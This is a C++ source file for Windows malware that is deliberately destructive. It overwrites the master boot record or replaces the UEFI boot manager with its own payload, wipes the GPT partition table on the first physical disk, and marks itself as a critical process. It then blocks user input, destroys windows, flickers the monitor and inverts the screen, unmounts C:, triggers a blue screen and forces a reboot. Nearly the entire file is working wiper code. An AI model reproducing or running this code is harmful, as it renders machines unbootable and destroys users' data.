#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <iostream>
#include <string>
#include "efi.h"

typedef NTSTATUS (NTAPI *pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

static const BYTE mbr_data[512] = {
    // ---- Boot code (18 bytes) ----
    0xBE, 0x13, 0x7C,       // mov si, 0x7C13   (point to the message string)
    0xFC,                   // cld
    0xAC,                   // lodsb            (load next char into AL, increment SI)
    0x84, 0xC0,             // test al, al      (check for null terminator)
    0x74, 0x07,             // jz  +7           (if zero, jump to HLT loop at offset 16)
    0xB4, 0x0E,             // mov ah, 0x0E     (BIOS teletype output function)
    0xCD, 0x10,             // int 0x10         (call BIOS video interrupt)
    0xEB, 0xF5,             // jmp -11          (jump back to 'lodsb')
    0xF4,                   // hlt              (halt CPU)
    0xEB, 0xFE,             // jmp $-2          (infinite loop)

    // ---- The message ----
    0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x21, 0x20, // "Hello! "
    0x49, 0x74, 0x20,                         // "It "
    0x73, 0x65, 0x65, 0x6D, 0x73, 0x20,       // "seems "
    0x73, 0x6F, 0x6D, 0x65, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x20, // "something "
    0x62, 0x61, 0x64, 0x20,                   // "bad "
    0x68, 0x61, 0x73, 0x20,                   // "has "
    0x68, 0x61, 0x70, 0x70, 0x65, 0x6E, 0x65, 0x64, 0x2E, // "happened."
    0x00,                                     // null terminator

    // ---- Padding (448 bytes of zeros) ----
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    0x55, 0xAA
};

bool IsUEFI() {
    std::cout << "[DEBUG] Checking firmware type..." << std::endl;

    typedef enum _FIRMWARE_TYPE {
        FirmwareTypeUnknown = 0,
        FirmwareTypeBios = 1,
        FirmwareTypeUefi = 2
    } FIRMWARE_TYPE;
    typedef BOOL (WINAPI *GetFirmwareType_t)(FIRMWARE_TYPE*);

    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel) {
        std::cout << "[DEBUG] kernel32.dll not loaded" << std::endl;
        return false;
    }

    auto GetFirmwareType = (GetFirmwareType_t)GetProcAddress(hKernel, "GetFirmwareType");
    if (GetFirmwareType) {
        FIRMWARE_TYPE type;
        if (GetFirmwareType(&type)) {
            bool isUefi = (type == FirmwareTypeUefi);
            std::cout << "[DEBUG] GetFirmwareType returned: " << (isUefi ? "UEFI" : "Legacy BIOS") << std::endl;
            return isUefi;
        }
    }

    bool isUefi = (GetFirmwareEnvironmentVariableW(L"", L"{00000000-0000-0000-0000-000000000000}",
                                                   nullptr, 0) != 0);
    std::cout << "[DEBUG] Fallback check returned: " << (isUefi ? "UEFI" : "Legacy BIOS") << std::endl;
    return isUefi;
}

std::wstring FindESP() {
    std::cout << "[DEBUG] Searching for ESP..." << std::endl;

    DWORD drives = GetLogicalDrives();
    for (char c = 'A'; c <= 'Z'; ++c) {
        if (drives & (1 << (c - 'A'))) {
            std::wstring root = std::wstring(1, c) + L":\\";
            UINT driveType = GetDriveTypeW(root.c_str());
            if (driveType != DRIVE_FIXED && driveType != DRIVE_REMOVABLE) continue;

            WCHAR fsName[MAX_PATH];
            if (!GetVolumeInformationW(root.c_str(), nullptr, 0, nullptr, nullptr,
                                       nullptr, fsName, MAX_PATH))
                continue;
            if (_wcsicmp(fsName, L"FAT32") != 0) continue;

            WCHAR testPath[MAX_PATH];
            swprintf_s(testPath, L"%sEFI", root.c_str());
            if (GetFileAttributesW(testPath) != INVALID_FILE_ATTRIBUTES) {
                std::wcout << L"[DEBUG] Found ESP (with drive letter): " << root << std::endl;
                return root;
            }
        }
    }

    std::cout << "[DEBUG] No ESP with drive letter found. Enumerating all volumes..." << std::endl;

    WCHAR volumeName[MAX_PATH];
    HANDLE hFind = FindFirstVolumeW(volumeName, MAX_PATH);
    if (hFind == INVALID_HANDLE_VALUE) {
        std::cout << "[DEBUG] FindFirstVolume failed. Error: " << GetLastError() << std::endl;
        return L"";
    }

    do {
        size_t len = wcslen(volumeName);
        if (len > 0 && volumeName[len-1] == L'\\')
            volumeName[len-1] = L'\0';

        WCHAR drivePath[MAX_PATH];
        DWORD dwSize = 0;
        bool hasDriveLetter = false;
        if (GetVolumePathNamesForVolumeNameW(volumeName, drivePath, MAX_PATH, &dwSize)) {
            if (wcslen(drivePath) > 0) {
                hasDriveLetter = true;
                std::wcout << L"[DEBUG] Volume " << volumeName << L" has drive letter " << drivePath << std::endl;
            }
        }

        std::wstring volPath = std::wstring(volumeName) + L"\\";
        WCHAR fsName[MAX_PATH];
        if (!GetVolumeInformationW(volPath.c_str(), nullptr, 0, nullptr, nullptr,
                                   nullptr, fsName, MAX_PATH)) {
            std::wcout << L"[DEBUG] GetVolumeInformation failed for " << volPath << L" (error: " << GetLastError() << L")" << std::endl;
            continue;
        }

        if (_wcsicmp(fsName, L"FAT32") != 0) {
            std::wcout << L"[DEBUG] " << volPath << L" is " << fsName << L", not FAT32." << std::endl;
            continue;
        }

        WCHAR testPath[MAX_PATH];
        swprintf_s(testPath, L"%sEFI", volPath.c_str());
        if (GetFileAttributesW(testPath) != INVALID_FILE_ATTRIBUTES) {
            std::wcout << L"[DEBUG] Found ESP at: " << volPath << std::endl;
            FindVolumeClose(hFind);
            return volPath;
        } else {
            std::wcout << L"[DEBUG] " << volPath << L" is FAT32 but has no \\EFI directory." << std::endl;
        }
    } while (FindNextVolumeW(hFind, volumeName, MAX_PATH));

    FindVolumeClose(hFind);
    std::cout << "[DEBUG] No ESP found." << std::endl;
    return L"";
}

bool WriteEFIAppToESP(const uint8_t* data, size_t size) {
    std::cout << "[DEBUG] Writing EFI app to ESP..." << std::endl;

    std::wstring espRoot = FindESP();
    if (espRoot.empty()) {
        std::cout << "[DEBUG] No ESP found, falling back to C:\\" << std::endl;
        espRoot = L"C:\\";
    }

    WCHAR dirPath[MAX_PATH];
    swprintf_s(dirPath, L"%s\\EFI\\BOOT", espRoot.c_str());
    if (!CreateDirectoryW(dirPath, nullptr)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS) {
            std::cout << "[DEBUG] Failed to create directory: " << GetLastError() << std::endl;
            return false;
        }
        std::cout << "[DEBUG] Directory already exists" << std::endl;
    }

    WCHAR filePath[MAX_PATH];
    // waow </3
    swprintf_s(filePath, L"%s\\EFI\\Microsoft\\Boot\\bootmgfw.efi", espRoot.c_str());
    std::wcout << L"[DEBUG] Writing to: " << filePath << std::endl;

    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cout << "[DEBUG] Failed to create file: " << GetLastError() << std::endl;
        return false;
    }

    DWORD written = 0;
    bool success = WriteFile(hFile, data, (DWORD)size, &written, nullptr);
    CloseHandle(hFile);

    if (success && written == size) {
        std::cout << "[DEBUG] EFI app written successfully (" << written << " bytes)" << std::endl;
    } else {
        std::cout << "[DEBUG] Write failed or incomplete: " << written << " of " << size << " bytes" << std::endl;
    }
    return success && (written == size);
}

bool EraseGPT() {
    std::cout << "[DEBUG] Erasing GPT on PhysicalDrive0..." << std::endl;

    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0",
                                GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                NULL,
                                OPEN_EXISTING,
                                0,
                                NULL);
    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cout << "[DEBUG] Failed to open PhysicalDrive0. Error: " << GetLastError() << std::endl;
        return false;
    }

    GET_LENGTH_INFORMATION lengthInfo;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0,
                         &lengthInfo, sizeof(lengthInfo), &bytesReturned, NULL)) {
        std::cout << "[DEBUG] Failed to get disk length. Error: " << GetLastError() << std::endl;
        CloseHandle(hDrive);
        return false;
    }
    LONGLONG totalSectors = lengthInfo.Length.QuadPart / 512;
    std::cout << "[DEBUG] Disk size: " << lengthInfo.Length.QuadPart << " bytes (" << totalSectors << " sectors)" << std::endl;

    const DWORD sectorSize = 512;
    const DWORD wipeSectors = 2048;

    DWORD totalBytes = wipeSectors * sectorSize;
    LPVOID pZero = LocalAlloc(LMEM_FIXED, totalBytes);
    if (!pZero) { CloseHandle(hDrive); return false; }
    ZeroMemory(pZero, totalBytes);

    DWORD written = 0;
    BOOL success = WriteFile(hDrive, pZero, totalBytes, &written, NULL);
    LocalFree(pZero);
    if (!success || written != totalBytes) {
        std::cout << "[DEBUG] Failed to wipe first 1 MB. Written: " << written << " bytes." << std::endl;
        CloseHandle(hDrive);
        return false;
    }
    FlushFileBuffers(hDrive);

    if (totalSectors > wipeSectors) {
        LARGE_INTEGER offset;
        offset.QuadPart = (totalSectors - wipeSectors) * sectorSize;
        if (SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN) == 0) {
            std::cout << "[DEBUG] Failed to seek to last 1 MB. Error: " << GetLastError() << std::endl;
            CloseHandle(hDrive);
            return false;
        }

        LPVOID pZeroLast = LocalAlloc(LMEM_FIXED, totalBytes);
        if (!pZeroLast) { CloseHandle(hDrive); return false; }
        ZeroMemory(pZeroLast, totalBytes);

        success = WriteFile(hDrive, pZeroLast, totalBytes, &written, NULL);
        LocalFree(pZeroLast);
        if (!success || written != totalBytes) {
            std::cout << "[DEBUG] Failed to wipe last 1 MB. Written: " << written << " bytes." << std::endl;
            CloseHandle(hDrive);
            return false;
        }
        FlushFileBuffers(hDrive);
    }

    CloseHandle(hDrive);
    std::cout << "[DEBUG] GPT erased thoroughly (first and last 1 MB)." << std::endl;
    return true;
}

BOOL CALLBACK destroy_window_callback(HWND hWnd, LPARAM) {
    SetWindowTextW(hWnd, L"\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n");
    SendMessageW(hWnd, WM_SETTEXT, 0, (LPARAM)L"\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n");
    SendMessageW(hWnd, WM_SETREDRAW, 0, 0);
    EnableWindow(hWnd, FALSE);
    DestroyWindow(hWnd);

    return TRUE;
}

[[noreturn]] void __fastcall spam_backspace() {
    while (true) {
        for (int i = 0; i < 256; ++i) {
            if (GetKeyState(i) < 0) {
                keybd_event(VK_BACK, 0, 0, 0);
                keybd_event(VK_BACK, 0, KEYEVENTF_KEYUP, 0);
            }
        }
    }
}

[[noreturn]] void __fastcall kill_windows() {
    while (true) {
        POINT pt;
        GetCursorPos(&pt);
        HWND hWndUnderCursor = WindowFromPoint(pt);
        EnumChildWindows(hWndUnderCursor, destroy_window_callback, 0);

        HWND hForeground = GetForegroundWindow();
        EnumChildWindows(hForeground, destroy_window_callback, 0);
    }
}

[[noreturn]] void __fastcall toggle_monitor_loop() {
    while (true) {
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        Sleep(2000);
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
    }
}

[[noreturn]] void __fastcall invert_screen() {
    HDC hdc = GetDC(NULL);
    int width  = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        PatBlt(hdc, 0, 0, width, height, PATINVERT);
        Sleep(600);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 1;

    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    GetProcAddress(hNtdll, "NtShutdownSystem");

    if (!RtlAdjustPrivilege || !NtSetInformationProcess) return 1;

    BOOLEAN bEnabled = FALSE;
    RtlAdjustPrivilege(20, TRUE, FALSE, &bEnabled);

    DWORD dwBreakOnTerm = 1;
    NtSetInformationProcess(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)29, &dwBreakOnTerm, sizeof(dwBreakOnTerm));

    bool writeSuccess = false;

    // writeSuccess = EraseGPT();

    if (IsUEFI()) {
        writeSuccess = WriteEFIAppToESP(test_efi, sizeof(test_efi));
        if (writeSuccess) {
            std::cout << "[DEBUG] EFI app written. Now erasing GPT..." << std::endl;
            EraseGPT();
        }
    } else {
        HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0",
                                    GENERIC_READ | GENERIC_WRITE,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                                    NULL,
                                    OPEN_EXISTING,
                                    0,
                                    NULL);
        if (hDrive != INVALID_HANDLE_VALUE) {
            LPVOID pBuffer = LocalAlloc(LMEM_FIXED, 0x10000);
            if (pBuffer) {
                memcpy(pBuffer, mbr_data, sizeof(mbr_data));
                DWORD dwBytesWritten = 0;
                if (WriteFile(hDrive, pBuffer, 0x10000, &dwBytesWritten, NULL)) {
                    writeSuccess = true;
                }
                LocalFree(pBuffer);
            }
            CloseHandle(hDrive);
        }
    }

    if (writeSuccess) {
        std::cout << "holy shit it works!" << std::endl;
        BlockInput(TRUE);

        HANDLE hThreads[6];
        hThreads[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)spam_backspace, NULL, 0, NULL);
        hThreads[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)kill_windows, NULL, 0, NULL);
        hThreads[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)toggle_monitor_loop, NULL, 0, NULL);
        hThreads[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)invert_screen, NULL, 0, NULL);
        hThreads[4] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)toggle_monitor_loop, NULL, 0, NULL);
        hThreads[5] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)toggle_monitor_loop, NULL, 0, NULL);

        for (int i = 0; i < 6; i++) {
            if (hThreads[i])
                SetThreadPriority(hThreads[i], THREAD_PRIORITY_TIME_CRITICAL);
        }

        Sleep(2000);
        DeleteVolumeMountPointA("C:\\");
        Sleep(4000);

        HMODULE hNtdll2 = LoadLibraryA("ntdll");
        if (hNtdll2) {
            pRtlAdjustPrivilege RtlAdjustPrivilege2 = (pRtlAdjustPrivilege)GetProcAddress(hNtdll2, "RtlAdjustPrivilege");
            pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll2, "NtRaiseHardError");

            if (RtlAdjustPrivilege2 && NtRaiseHardError) {
                BOOLEAN bEnabled2 = FALSE;
                RtlAdjustPrivilege2(19, TRUE, FALSE, &bEnabled2);
                BOOLEAN bEnabled3 = FALSE;
                RtlAdjustPrivilege2(19, TRUE, FALSE, &bEnabled3);

                ULONG_PTR args = 0;
                ULONG response = 0;
                NtRaiseHardError(0xC00000B4, 0, 0, &args, 6, &response);
            }
        }

        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &tp.Privileges[0].Luid)) {
                AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
            }
            CloseHandle(hToken);
        }

        ExitWindowsEx(EWX_REBOOT, 0x10007);
    }

    Sleep(INFINITE);
    return 0;
}